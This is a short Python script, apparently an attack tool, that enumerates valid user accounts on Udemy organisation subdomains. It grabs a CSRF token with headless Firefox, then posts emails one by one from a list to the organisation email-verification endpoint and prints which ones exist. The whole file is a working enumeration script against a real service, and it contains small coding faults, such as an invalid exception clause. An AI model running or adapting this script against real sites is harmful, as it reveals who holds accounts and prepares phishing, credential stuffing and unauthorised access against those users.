import requests
import argparse
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time

#Parsing all the required arguments
parser = argparse.ArgumentParser(description="User enumeration on Udemy subdomains")
#parser.add_argument("Subdomain:", help="The subdomain of udemy.com")
#parser.add_argument("EmailList:", help="The newline delimited list of emails")
parser.add_argument("-el", "--EmailList", help="The file conatining the list of emails")
parser.add_argument("-em", "--Email",help="Email address to be tested")
parser.add_argument("SubDomain", help="The Sub-domain of udemy.com")
args = parser.parse_args()
if args.EmailList is None and args.Email is None:
    parser.error("Enter either one email or a list of emails")
subdomain = args.SubDomain.replace(".udemy.com", "")

#Function to get csrftoken
def GetCookies():
    option1 = Options()
    option1.headless = True
    #try and catch for firefox
    try:
        driver = webdriver.Firefox(options=option1)
    except expression as identifier:
        pass
    
    
    #sleep for browser to open up
    #time.sleep(5)

    #making a request and extracting the csrftoken
    driver.get("https://{}.udemy.com".format(subdomain))
    csrftoken = driver.get_cookie("csrftoken")
    csrftoken = csrftoken['value']
    driver.close()
    return csrftoken


def CheckUser(email):
    email = email
    session = requests.Session()

    # required data for a session
    headers1={
       "Content-Type": "multipart/form-data; boundary=---------------------------158542217294190461230207617",
        "Referer": "https://{}.udemy.com/".format(subdomain),
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
    }
    cookies1={
        "csrftoken": csrftoken
    }
    response = requests.post("https://{}.udemy.com/organization/organization-verify-email/".format(subdomain), data='$-----------------------------158542217294190461230207617\r\nContent-Disposition: form-data; name="email"\r\n\r\n{}\r\n-----------------------------158542217294190461230207617\r\nContent-Disposition: form-data; name="csrfmiddlewaretoken"\r\n\r\n{}\r\n-----------------------------158542217294190461230207617--\r\n'.format(email, csrftoken), headers=headers1, cookies=cookies1)
    if response.status_code == 200:
        print("Email %s is a valid account" %email)

# parsing the emails from the list file and passing it to the function
csrftoken = GetCookies()
#print(csrftoken)
if args.EmailList:
    EL = open(args.EmailList)
    mail = map(str.strip, EL.readlines())
    EL.close()
    for ml in mail:
        CheckUser(ml)
elif args.Email:
    mail = args.Email
    CheckUser(mail)


